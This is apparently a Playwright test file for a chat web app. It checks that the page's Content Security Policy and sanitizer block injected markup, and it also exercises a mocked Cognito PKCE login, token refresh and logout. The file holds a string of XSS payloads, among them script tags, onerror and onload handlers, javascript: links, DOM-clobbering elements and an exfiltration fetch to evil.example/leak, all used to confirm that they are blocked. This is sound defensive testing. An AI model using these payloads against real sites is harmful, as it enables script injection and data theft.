// Chromium enforces the page's CSP and SRI; AWS/model I/O is simulated.
const { test } = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const { chromium } = require("playwright");

const root = path.join(__dirname, "..");
const CALLBACK = "https://celesteisyy.github.io/playground/";
const API = "https://18-118-248-231.sslip.io";
const ISSUER = "https://cognito-idp.us-east-2.amazonaws.com/us-east-2_0G8Lq71Sw";
const HOSTED = "https://us-east-20g8lq71sw.auth.us-east-2.amazoncognito.com";
const malicious = `<script>window.__attack=1</script><img src="https://evil.example/leak" onerror="window.__attack=1"><svg onload="window.__attack=1"></svg><iframe src="https://evil.example/"></iframe><style>@import url(https://evil.example/style)</style><a href="javascript:window.__attack=1">Bad</a><form><input name="CyssieAuth"></form><a id="CyssieAuth" href="${API}/downloads/diagrams/test.drawio">Diagram</a>`;

async function mount(t, mode) {
  const browser = await chromium.launch({ headless: true });
  t.after(() => browser.close());
  const context = await browser.newContext({ acceptDownloads: true });
  const page = await context.newPage();
  const calls = [], errors = [];
  const state = { nonce: "", token: "access-test", refreshes: 0, revoked: 0, reject: false };
  page.on("pageerror", e => errors.push(e.message));
  await context.route("**/*", async route => {
    const req = route.request();
    const url = new URL(req.url());
    calls.push({ url: req.url(), method: req.method(), auth: req.headers().authorization });
    const cors = {
      "access-control-allow-origin": new URL(CALLBACK).origin,
      "access-control-allow-methods": "GET,POST,OPTIONS",
      "access-control-allow-headers": "Authorization,Content-Type"
    };
    const json = (body, status = 200) => route.fulfill({ status, headers: cors, contentType: "application/json", body: JSON.stringify(body) });
    if (req.method() === "OPTIONS") return route.fulfill({ status: 204, headers: cors });
    if (url.origin === new URL(CALLBACK).origin) {
      const relative = decodeURIComponent(url.pathname.slice("/playground/".length));
      const file = path.resolve(root, relative || "index.html");
      if (!file.startsWith(root + path.sep) || !fs.existsSync(file)) return route.fulfill({ status: 404, body: "missing" });
      const contentType = file.endsWith(".js") ? "application/javascript" : file.endsWith(".css") ? "text/css" : "text/html";
      return route.fulfill({ contentType, body: fs.readFileSync(file) });
    }
    if (url.origin === API) {
      if (url.pathname === "/auth/config") return json(mode === "legacy" ? { mode } : {
        mode, authority: ISSUER, client_id: "testclient", redirect_uri: CALLBACK, scope: "openid email"
      });
      if (!req.headers().authorization || state.reject) return json({ detail: "Unauthorized" }, 401);
      if (url.pathname === "/auth/me") return json({ authenticated: true });
      if (url.pathname === "/chat_stream") return route.fulfill({ headers: cors, contentType: "text/plain", body: `Hello **Cyssie**. ${malicious}` });
      if (url.pathname === "/vision") return json({ response: "Image received." });
      if (url.pathname.startsWith("/downloads/")) return route.fulfill({ headers: cors, contentType: "application/vnd.jgraph.mxfile", body: "<mxfile/>" });
      return json({ status: "reset" });
    }
    if (req.url() === `${ISSUER}/.well-known/openid-configuration`) return json({
      issuer: ISSUER, authorization_endpoint: `${HOSTED}/oauth2/authorize`,
      token_endpoint: `${HOSTED}/oauth2/token`, revocation_endpoint: `${HOSTED}/oauth2/revoke`
    });
    if (url.origin === HOSTED) {
      if (url.pathname === "/oauth2/authorize") {
        state.nonce = url.searchParams.get("nonce");
        assert.equal(url.searchParams.get("code_challenge_method"), "S256");
        assert.ok(url.searchParams.get("code_challenge"));
        return route.fulfill({ contentType: "text/html", body: "<p>Simulated Cognito sign-in</p>" });
      }
      if (url.pathname === "/oauth2/token") {
        const params = new URLSearchParams(req.postData());
        assert.equal(params.get("client_id"), "testclient");
        if (params.get("grant_type") === "refresh_token") {
          state.refreshes++;
          state.token = "renewed-access-test";
        } else {
          assert.equal(params.get("grant_type"), "authorization_code");
          assert.ok(params.get("code_verifier"));
        }
        const encode = obj => Buffer.from(JSON.stringify(obj)).toString("base64url");
        const now = Math.floor(Date.now() / 1000);
        return json({ access_token: state.token, refresh_token: "refresh-test", token_type: "Bearer", expires_in: 120,
          id_token: `${encode({ alg: "RS256" })}.${encode({ sub: "owner", iss: ISSUER, aud: "testclient", nonce: state.nonce, iat: now, exp: now + 120 })}.signature`, scope: "openid email" });
      }
      if (url.pathname === "/oauth2/revoke") { state.revoked++; return route.fulfill({ status: 200, headers: cors, body: "" }); }
      if (url.pathname === "/logout") return route.fulfill({ contentType: "text/html", body: "<p>Signed out</p>" });
    }
    return route.fulfill({ status: 404, body: "blocked test destination" });
  });
  await page.goto(CALLBACK);
  await page.waitForFunction(() => !document.querySelector("#saveTokenButton").disabled);
  return { page, context, calls, errors, state };
}

async function send(page, text) {
  await page.locator("#messageInput").fill(text);
  await page.locator("#sendButton").click();
  await page.waitForFunction(() => !document.querySelector("#sendButton").disabled);
}

test("CSP blocks script/network injection while chat, sanitization, upload and downloads work", { timeout: 60000 }, async t => {
  const { page, calls, errors, state } = await mount(t, "legacy");
  await page.locator("#tokenInput").fill("legacy-test");
  await page.locator("#saveTokenButton").click();
  await send(page, "hello");
  assert.match(await page.locator("#chat").innerText(), /Hello Cyssie/);
  assert.equal(await page.locator("#chat script,#chat img,#chat svg,#chat iframe,#chat style,#chat form").count(), 0);
  assert.equal(await page.locator('#chat a[href^="javascript:"]').count(), 0);
  assert.equal(await page.locator("#chat #CyssieAuth").count(), 0);
  assert.ok(calls.some(c => c.url.endsWith("/chat_stream") && c.auth === "Bearer legacy-test"));
  assert.equal(await page.evaluate(() => window.__attack), undefined);
  const downloadPromise = page.waitForEvent("download");
  await page.getByRole("link", { name: "Diagram", exact: true }).click();
  assert.equal((await downloadPromise).suggestedFilename(), "test.drawio");
  await page.locator('input[type="file"]').setInputFiles({ name: "test.png", mimeType: "image/png", buffer: Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+a4j8AAAAASUVORK5CYII=", "base64") });
  await send(page, "look");
  assert.match(await page.locator("#chat").innerText(), /Image received/);
  assert.ok(calls.some(c => c.url.endsWith("/vision") && c.auth === "Bearer legacy-test"));

  const before = calls.length;
  const blocked = await page.evaluate(async () => {
    const inline = document.createElement("script");
    inline.textContent = "window.__attack=2";
    document.body.appendChild(inline);
    const external = document.createElement("script");
    external.src = "/playground/untrusted.js";
    document.body.appendChild(external);
    const image = document.createElement("img");
    image.setAttribute("onerror", "window.__attack=3");
    image.src = "/playground/no-image.png";
    document.body.appendChild(image);
    let denied = false;
    try { await fetch("https://evil.example/leak"); } catch { denied = true; }
    await new Promise(resolve => setTimeout(resolve, 50));
    return { denied, ran: window.__attack || false };
  });
  assert.deepEqual(blocked, { denied: true, ran: false });
  assert.ok(!calls.slice(before).some(c => c.url.includes("evil.example") || c.url.endsWith("untrusted.js")));
  assert.deepEqual(errors, []);
  state.reject = true;
  await send(page, "expired");
  assert.match(await page.locator("#authDescription").innerText(), /sign in again/);
});

test("Cognito PKCE callback, reload, refresh and logout work under the enforced CSP", { timeout: 60000 }, async t => {
  const { page, context, calls, errors, state } = await mount(t, "cognito");
  await page.locator("#saveTokenButton").click();
  await page.waitForURL(url => url.origin === HOSTED && url.pathname === "/oauth2/authorize");
  const authorization = new URL(page.url());
  await page.goto(`${CALLBACK}?code=test-code&state=${authorization.searchParams.get("state")}`);
  await page.waitForFunction(() => document.querySelector("#tokenButton").textContent === "Sign out");
  assert.equal(page.url(), CALLBACK);
  await send(page, "hello");
  assert.ok(calls.some(c => c.url.endsWith("/chat_stream") && c.auth === "Bearer access-test"));
  await page.reload();
  await page.waitForFunction(() => document.querySelector("#tokenButton").textContent === "Sign out");
  await page.evaluate(() => { const original = Date.now; Date.now = () => original() + 70000; });
  await send(page, "renew");
  assert.equal(state.refreshes, 1);
  assert.ok(calls.some(c => c.url.endsWith("/chat_stream") && c.auth === "Bearer renewed-access-test"));
  await page.locator("#tokenButton").click();
  await page.waitForURL(url => url.origin === HOSTED && url.pathname === "/logout");
  assert.equal(state.revoked, 1);
  await page.goto(CALLBACK);
  await page.waitForFunction(() => document.querySelector("#saveTokenButton").textContent === "Sign in");
  assert.equal(await page.evaluate(() => Object.keys(sessionStorage).filter(k => k.startsWith("cyssie.user.")).length), 0);
  assert.deepEqual(errors, []);
});
